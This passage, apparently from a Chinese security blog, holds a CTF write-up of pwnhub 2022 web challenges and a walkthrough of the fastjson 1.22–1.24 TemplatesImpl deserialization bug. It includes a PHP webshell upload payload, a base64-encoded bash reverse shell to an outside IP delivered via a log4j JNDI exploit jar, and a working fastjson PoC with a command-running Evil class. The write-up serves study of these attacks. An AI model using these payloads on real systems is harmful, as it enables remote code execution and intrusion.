&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;input[<span class="string">&quot;var&quot;</span>];</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&#x27;/tmp/sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$value</span>[<span class="string">&#x27;file&#x27;</span>]), <span class="variable">$value</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;output = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他有一个反序列化字符串的地方，没有过滤或者限制</p><p>因此直接就能phpinfo</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427231142-x05ny6k.png" alt="image.png"></p><p>但是并没有什么用，不过我们可以知道remote_addr的值为218.94.97.29</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427223626-o2z27cp.png" alt="image.png"></p><p>接下来尝试用下面的方法写shell进去，没有任何过滤</p><p>但是写入的shell会在<code>/tmp/sandbox/027abbac7d8dc5486b5f33965cfce8c4/</code>目录下，没办法直接访问</p><p>因为<code>$this-&gt;class</code>可控而且拼接，所以可以直接目录穿越包含刚刚写入的shell</p><p>但是这里要注意他有个后缀<code>Tool.php</code>，因此写入的时候让文件名也是<code>xxxTool.php</code>即可</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427232239-1j95apf.png" alt="image.png"></p><p>写入：</p><p>post</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y0U_CA0_n3vEr_F1nD_m3_LOL[file]=asoulTool.php&amp;Y0U_CA0_n3vEr_F1nD_m3_LOL[data]=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含：</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427232053-xffndtq.png" alt="image.png"></p><h1 id="EzPDFParser"><a href="#EzPDFParser" class="headerlink" title="EzPDFParser"></a>EzPDFParser</h1><blockquote><p><a href="https://votiro.com/blog/preventing-log4j-cve-2021-44228-exploits-using-pdf-as-a-delivery-channel/">https://votiro.com/blog/preventing-log4j-cve-2021-44228-exploits-using-pdf-as-a-delivery-channel/</a></p><p>漏洞复现类赛题</p></blockquote><p>通过题目war包可以看到log4j的依赖</p><p>反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="keyword">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy4xNDQuNDEvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>vps开启监听</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy4xNDQuNDEvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="number">1.117</span>.<span class="number">144.41</span></span><br></pre></td></tr></table></figure><p>pdf插入payload</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427234433-p9c1ntp.png" alt="image.png"></p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220427234415-7nlu79x.png" alt="image.png"></p><h1 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h1><p>并发可以写入，比赛的时候写进去了，但是当时环境有问题，之后修复环境之后一血就没了</p>]]></content>
    
    
    <summary type="html">pwnhub2022春季赛 web部分的复现</summary>
    
    
    
    <category term="ctfStudy" scheme="https://xianbeil.github.io/categories/ctfStudy/"/>
    
    
    <category term="wp" scheme="https://xianbeil.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>fastjson1.22-1.24反序列化</title>
    <link href="https://xianbeil.github.io/2022/04/27/fastjson1-22templates/"/>
    <id>https://xianbeil.github.io/2022/04/27/fastjson1-22templates/</id>
    <published>2022-04-27T07:39:56.000Z</published>
    <updated>2022-04-27T07:42:00.630Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjson基础"><a href="#fastjson基础" class="headerlink" title="fastjson基础"></a>fastjson基础</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="什么是fastjson"><a href="#什么是fastjson" class="headerlink" title="什么是fastjson"></a>什么是fastjson</h2><ol><li>fastjson 是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean</li><li>FastJson 与 Google 的 Gson 都是解析 Json 的强者，两者不相伯仲</li><li><a href="https://github.com/alibaba/fastjson" title="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></li><li>fastjson 会不定期发布针对 android 版本优化的版本，android优化版本是去掉不必要的代码，减少体积，功能和标准版本基本一样。 已发布的android版本包括：<a href="http://repo1.maven.org/maven2/com/alibaba/fastjson/1.1.51.android/">http://repo1.maven.org/maven2/com/alibaba/fastjson/1.1.51.android/</a><br /></li></ol><p>maven配置一下依赖就能开始用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.49</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h1 id="Map转JSON字符串"><a href="#Map转JSON字符串" class="headerlink" title="Map转JSON字符串"></a>Map转JSON字符串</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">map2json</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map1.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        map1.put(<span class="string">&quot;key2&quot;</span>,<span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(map1);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220420143036-shht8mn.png" alt="image.png"></p><h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><h2 id="POJO-List-转-JSON-字符串"><a href="#POJO-List-转-JSON-字符串" class="headerlink" title="POJO List 转 JSON 字符串"></a>POJO List 转 JSON 字符串</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.fastjson.basic.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">pojolist2json</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">mike</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Mike&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">nancy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Nancy&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Person&gt; persons = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        persons.add(mike);</span><br><span class="line">        persons.add(nancy);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(persons);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220420144603-wtodusg.png" alt="image.png">1</p><h2 id="Json-字符串转-JsonObject"><a href="#Json-字符串转-JsonObject" class="headerlink" title="Json 字符串转 JsonObject"></a>Json 字符串转 JsonObject</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">json2jsonObj</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name1\&quot;:\&quot;mike\&quot;,\&quot;name2\&quot;:\&quot;john\&quot;,\&quot;key1\&quot;:123&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> JSON.parseObject(jsonString);</span><br><span class="line">        System.out.println(object.getString(<span class="string">&quot;name1&quot;</span>));</span><br><span class="line">        System.out.println(object.getInteger(<span class="string">&quot;key1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220420145133-0jcinsv.png" alt="image.png"></p><h1 id="Fastjson1-22-1-24反序列化"><a href="#Fastjson1-22-1-24反序列化" class="headerlink" title="Fastjson1.22-1.24反序列化"></a>Fastjson1.22-1.24反序列化</h1><h1 id="TEMPLATESIMPL环境-amp-复现"><a href="#TEMPLATESIMPL环境-amp-复现" class="headerlink" title="TEMPLATESIMPL环境&amp;复现"></a>TEMPLATESIMPL环境&amp;复现</h1><p>jdk 1.8<br>fastjson 1.22</p><p>先编写一个恶意类Evil，编译为class文件后放在本地，我们需要他的字节码</p><p>这个类的构造方法中会<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.exploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Evil</span> <span class="variable">helloworld</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再<del>编写</del>（网上找了）一个调用了触发漏洞方法的客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.exploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bad_method</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;file.separator&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil_path</span> <span class="operator">=</span> <span class="string">&quot;C:\\Users\\AEQAQ\\Desktop\\gc-tool\\fasjJ1\\target\\classes\\com\\fastjson\\exploit\\Evil.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil_code</span> <span class="operator">=</span> readClass(evil_path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evil_code+<span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        bad_method();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个客户端做的事情也很简单：</p><ol><li><p>读取class文件，并将其base64编码</p></li><li><p>创建json字符串 text1，其中<code>@type</code>设置为我们很熟悉的类<code>TemplatesImpl</code></p></li><li><p><code>JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</code></p><p> 这是漏洞触发的核心点</p></li><li><p>这里我们转化为对象的字符串，也就是包含了恶意class的字符串为</p> <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAA...(省略一大段base64)&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">&#x27;_name&#x27;<span class="punctuation">:</span>&#x27;a.b&#x27;<span class="punctuation">,</span></span><br><span class="line">&#x27;_tfactory&#x27;<span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422202449-m5xmuiz.png" alt="image.png"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><blockquote><p>通过最简单的利用TemplatesImpl反序列化来学习fastjson1.22-1.24漏洞</p></blockquote><p>在<code>JSON.parseObject</code>处打上断点，下面主要分析这个方法中的流程</p><p>不得不说，这个调用还挺长的，所以我写的尽量详细点，对其中的一些方法和算法单独列出来分析，为以后回来看或者分析其他组件提供经验（吧。。）。</p><p>Fastjson反序列化的类方法调用关系</p><p>在这条利用TemplateImpl的利用链中，主要牵扯的还是靠左边的Deserializer</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422200212-mraj3zc.png" alt="image.png"></p><h2 id="JSON-parseObject"><a href="#JSON-parseObject" class="headerlink" title="JSON.parseObject"></a>JSON.parseObject</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422230857-4dz2cq4.png" alt="image.png"></p><p>先会对Feature数组进行遍历，并对mask值进行或运算，这里mask是有初值的，并将结果赋值给featureValues</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422231234-7m5244f.png" alt="image.png"></p><p>接着会返回一个DefaultJSONParser对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DefaultJSONParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultJSONParser</span>(input, config, featureValues);</span><br></pre></td></tr></table></figure><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422233123-exoj21l.png" alt="image.png"></p><p>可以看到我们的json字符串和features都被保存在这个parser里</p><p>其中lexer字段是一个JSONScanner对象，这里我们分析一下DefaultJSONParser对象的构造方法</p><h2 id="DefaultJSONParser构造方法"><a href="#DefaultJSONParser构造方法" class="headerlink" title="DefaultJSONParser构造方法"></a>DefaultJSONParser构造方法</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422233653-k3i7ci4.png" alt="image.png"></p><p>可以看到这个构造方法中，根据我们传入的input和features，会先构造一个JSONScanner对象</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422234656-vtdedwz.png" alt="image.png"></p><p>这里由于ch是”{“，所以设置token为12</p><h2 id="DefaultJSONParser-parseObject-Type-type-Object-fieldName"><a href="#DefaultJSONParser-parseObject-Type-type-Object-fieldName" class="headerlink" title="DefaultJSONParser.parseObject(Type type,Object fieldName)"></a>DefaultJSONParser.parseObject(Type type,Object fieldName)</h2><p>接着调用parseObject方法，继续跟进</p><p>先返回token，这里为12，然后进到具体的处理部分</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422233500-7oc40xw.png" alt="image.png"></p><p>先返回一个derializer，然后再调用它其中的方法</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235022-h4b5mcx.png" alt="image.png"></p><h2 id="JavaObjectDeserializer-deserialze"><a href="#JavaObjectDeserializer-deserialze" class="headerlink" title="JavaObjectDeserializer.deserialze"></a>JavaObjectDeserializer.deserialze</h2><p><code>com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze</code></p><p>因此我们跟进deserialize方法</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235206-fn6d1d1.png" alt="image.png"></p><p>由于<code>parser.parseObject(clazz, (Object)null);</code>中传入的是Object类，所以这里跳过了if判断，直接进到return那一句里</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235523-fkrunuq.png" alt="image.png"></p><p>三元运算为false，进到<code>DefaultJSONParser.parse</code>方法中</p><h2 id="DefaultJSONParser-parse-java-lang-Object"><a href="#DefaultJSONParser-parse-java-lang-Object" class="headerlink" title="DefaultJSONParser.parse(java.lang.Object)"></a>DefaultJSONParser.parse(java.lang.Object)</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220422235639-3b45azg.png" alt="image.png"></p><p>最终会进到case 12里面</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423001637-lxvvcqs.png" alt="image.png"></p><p>然后调用<code>DefaultJSONParser.parseObject</code>方法</p><h2 id="DefaultJSONParser-parseObject-java-util-Map-java-lang-Object"><a href="#DefaultJSONParser-parseObject-java-util-Map-java-lang-Object" class="headerlink" title="DefaultJSONParser.parseObject(java.util.Map, java.lang.Object)"></a>DefaultJSONParser.parseObject(java.util.Map, java.lang.Object)</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423024252-2ecqiry.png" alt="image.png"></p><p>因为在DefaultJSONParser的构造方法中已经调用过一次next方法了，所以现在的ch是<code>&quot;</code>,34，所以会进到这个判断</p><p>scanSymbol则会取出<code>&quot;</code>之间的数据</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423002323-z2uqm4h.png" alt="image.png"></p><p>取出json对象的第一个key，也就是<code>@type</code></p><blockquote><p>还记得json中的<code>@type</code>所对应的数据是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，也就是我们要实例化的恶意类的类名。</p></blockquote><p>加载了TemplateImpl类</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220423002549-grnww83.png" alt="image.png"></p><p>然后接着往下走，就进入这个地方</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220426005938-jjbq5e5.png" alt="image.png"></p><p>这里先通过scanSymbol来获取到<code>&quot;</code>间的数据，然后用<code>TypeUtils.loadClass</code>方法来加载这个类</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220426010128-2jlc4wl.png" alt="image.png"></p><p>最后在这个方法中实例化恶意类</p><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220426010227-ot3k7ef.png" alt="image.png"></p><h2 id="JavaBeanDeserializer-deserialze"><a href="#JavaBeanDeserializer-deserialze" class="headerlink" 